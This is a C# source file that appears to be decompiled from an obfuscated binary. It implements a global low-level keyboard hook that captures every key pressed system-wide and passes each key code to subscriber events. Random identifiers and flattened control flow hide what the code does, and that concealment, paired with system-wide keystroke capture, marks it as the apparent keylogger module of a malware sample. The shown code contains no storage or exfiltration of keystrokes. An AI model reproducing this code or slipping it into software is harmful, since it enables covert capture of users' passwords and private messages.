using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace X5CZaoh;

public class POq2Ux
{
	public delegate void dJ6hm7Zqsi(Keys Key);

	public delegate void _0xe0haG8GWS(Keys Key);

	private delegate int L8S(int nCode, IntPtr wParam, IntPtr lParam);

	private struct lUly1R
	{
		public uint vkCode;

		public uint scanCode;

		public _265dUUiD flags;

		public uint time;

		public UIntPtr dwExtraInfo;
	}

	[Flags]
	private enum _265dUUiD
	{
		LLKHF_EXTENDED = 1,
		LLKHF_INJECTED = 0x10,
		LLKHF_ALTDOWN = 0x20,
		LLKHF_UP = 0x80
	}

	private const int WH_KEYBOARD_LL = 13;

	private const int HC_ACTION = 0;

	private const int WM_KEYDOWN = 256;

	private const int WM_KEYUP = 257;

	private const int WM_SYSKEYDOWN = 260;

	private const int WM_SYSKEYUP = 261;

	private dJ6hm7Zqsi m_KeyDown;

	private _0xe0haG8GWS m_KeyUp;

	private readonly L8S KBDLLHookProcDelegate;

	private IntPtr HookId = IntPtr.Zero;

	public event dJ6hm7Zqsi KeyDown
	{
		add
		{
			int num = 0;
			dJ6hm7Zqsi value2 = default;
			dJ6hm7Zqsi dJ6hm7Zqsi2 = default;
			dJ6hm7Zqsi dJ6hm7Zqsi3 = default;
			do
			{
				if (num == 2)
				{
					goto IL_001f;
				}
				goto IL_0030;
				IL_0030:
				if (num == 3)
				{
					value2 = (dJ6hm7Zqsi)Delegate.Combine(dJ6hm7Zqsi2, value);
					num = 4;
				}
				if (num == 4)
				{
					dJ6hm7Zqsi3 = Interlocked.CompareExchange(ref this.m_KeyDown, value2, dJ6hm7Zqsi2);
					num = 5;
				}
				if (num == 5)
				{
					if ((object)dJ6hm7Zqsi3 != dJ6hm7Zqsi2)
					{
						goto IL_001f;
					}
					num = 6;
				}
				if (num == 1)
				{
					dJ6hm7Zqsi3 = this.m_KeyDown;
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
				continue;
				IL_001f:
				dJ6hm7Zqsi2 = dJ6hm7Zqsi3;
				num = 3;
				goto IL_0030;
			}
			while (num != 6);
		}
		remove
		{
			int num = 0;
			dJ6hm7Zqsi dJ6hm7Zqsi2 = default;
			dJ6hm7Zqsi value2 = default;
			dJ6hm7Zqsi dJ6hm7Zqsi3 = default;
			do
			{
				if (num == 4)
				{
					dJ6hm7Zqsi2 = Interlocked.CompareExchange(ref this.m_KeyDown, value2, dJ6hm7Zqsi3);
					num = 5;
				}
				if (num == 5)
				{
					if ((object)dJ6hm7Zqsi2 != dJ6hm7Zqsi3)
					{
						goto IL_00aa;
					}
					num = 6;
				}
				if (num == 3)
				{
					value2 = (dJ6hm7Zqsi)Delegate.Remove(dJ6hm7Zqsi3, value);
					num = 4;
				}
				if (num == 2)
				{
					goto IL_00aa;
				}
				goto IL_00bb;
				IL_00aa:
				dJ6hm7Zqsi3 = dJ6hm7Zqsi2;
				num = 3;
				goto IL_00bb;
				IL_00bb:
				if (num == 1)
				{
					dJ6hm7Zqsi2 = this.m_KeyDown;
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 6);
		}
	}

	public event _0xe0haG8GWS KeyUp
	{
		add
		{
			int num = 0;
			_0xe0haG8GWS obj = default;
			_0xe0haG8GWS obj2 = default;
			_0xe0haG8GWS value2 = default;
			do
			{
				if (num == 5)
				{
					if ((object)obj != obj2)
					{
						goto IL_00aa;
					}
					num = 6;
				}
				if (num == 3)
				{
					value2 = (_0xe0haG8GWS)Delegate.Combine(obj2, value);
					num = 4;
				}
				if (num == 4)
				{
					obj = Interlocked.CompareExchange(ref this.m_KeyUp, value2, obj2);
					num = 5;
				}
				if (num == 2)
				{
					goto IL_00aa;
				}
				goto IL_00bb;
				IL_00aa:
				obj2 = obj;
				num = 3;
				goto IL_00bb;
				IL_00bb:
				if (num == 1)
				{
					obj = this.m_KeyUp;
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 6);
		}
		remove
		{
			int num = 0;
			_0xe0haG8GWS obj = default;
			_0xe0haG8GWS value2 = default;
			_0xe0haG8GWS obj2 = default;
			do
			{
				if (num == 4)
				{
					obj = Interlocked.CompareExchange(ref this.m_KeyUp, value2, obj2);
					num = 5;
				}
				if (num == 5)
				{
					if ((object)obj != obj2)
					{
						goto IL_00aa;
					}
					num = 6;
				}
				if (num == 3)
				{
					value2 = (_0xe0haG8GWS)Delegate.Remove(obj2, value);
					num = 4;
				}
				if (num == 2)
				{
					goto IL_00aa;
				}
				goto IL_00bb;
				IL_00aa:
				obj2 = obj;
				num = 3;
				goto IL_00bb;
				IL_00bb:
				if (num == 1)
				{
					obj = this.m_KeyUp;
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 6);
		}
	}

	public POq2Ux()
	{
		KBDLLHookProcDelegate = aAuatPUgv;
	}

	private int aAuatPUgv(int _9fFcNHvcMi, IntPtr _4kh, IntPtr lwwqh)
	{
		int num = 0;
		lUly1R lUly1R2 = default;
		lUly1R lUly1R3 = default;
		int num2 = default;
		do
		{
			if (num == 11)
			{
				this.m_KeyUp((Keys)lUly1R2.vkCode);
				num = 12;
			}
			if (num == 4)
			{
				break;
			}
			if (num == 10)
			{
				lUly1R2 = (lUly1R)Marshal.PtrToStructure(lwwqh, typeof(lUly1R));
				num = 11;
			}
			if (num == 7)
			{
				this.m_KeyDown((Keys)lUly1R3.vkCode);
				num = 8;
			}
			if (num == 3)
			{
				switch (num2)
				{
				case 257:
				case 261:
					goto IL_014d;
				case 256:
				case 260:
					goto IL_0175;
				case 258:
				case 259:
					goto end_IL_000e;
				}
				num = 4;
			}
			if (num == 6)
			{
				lUly1R3 = (lUly1R)Marshal.PtrToStructure(lwwqh, typeof(lUly1R));
				num = 7;
			}
			if (num == 9)
			{
				goto IL_014d;
			}
			goto IL_0164;
			IL_0175:
			if (this.m_KeyDown == null)
			{
				break;
			}
			num = 6;
			goto IL_018c;
			IL_014d:
			if (this.m_KeyUp == null)
			{
				break;
			}
			num = 10;
			goto IL_0164;
			IL_0164:
			if (num == 5)
			{
				goto IL_0175;
			}
			goto IL_018c;
			IL_018c:
			if (num == 8)
			{
				break;
			}
			if (num == 2)
			{
				num2 = _4kh.ToInt32();
				num = 3;
			}
			if (num == 1)
			{
				if (_9fFcNHvcMi < 0)
				{
					break;
				}
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
			continue;
			end_IL_000e:
			break;
		}
		while (num != 12);
		return CallNextHookEx(IntPtr.Zero, _9fFcNHvcMi, _4kh, lwwqh);
	}

	public void kHSOsUTD()
	{
		int num = 0;
		int num2 = default;
		while (true)
		{
			if (num == 2)
			{
				goto IL_0101;
			}
			if (num == 1)
			{
				num2 = 0;
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num == 3)
			{
				goto IL_0086;
			}
			continue;
			IL_0101:
			if (num2 > 10)
			{
				break;
			}
			goto IL_0086;
			IL_0086:
			try
			{
				string moduleName = Process.GetCurrentProcess().MainModule.ModuleName;
				IntPtr moduleHandle = GetModuleHandle(moduleName);
				HookId = SetWindowsHookEx(13, KBDLLHookProcDelegate, moduleHandle, 0);
				if (HookId != IntPtr.Zero)
				{
					break;
				}
			}
			catch
			{
			}
			num2++;
			goto IL_0101;
		}
	}

	public void egyjbjUKaDi()
	{
		int num = 0;
		do
		{
			if (num == 1)
			{
				if (!(HookId != IntPtr.Zero))
				{
					break;
				}
				num = 2;
			}
			if (num == 2)
			{
				UnhookWindowsHookEx(HookId);
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
	}

	~POq2Ux()
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			if (HookId != IntPtr.Zero)
			{
				UnhookWindowsHookEx(HookId);
			}
		}
		finally
		{
			base.Finalize();
		}
	}

	[DllImport("user32.dll")]
	private static extern IntPtr SetWindowsHookEx(int idHook, L8S HookProc, IntPtr hInstance, int wParam);

	[DllImport("user32.dll")]
	private static extern int CallNextHookEx(IntPtr idHook, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll")]
	private static extern bool UnhookWindowsHookEx(IntPtr idHook);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string lpModuleName);
}
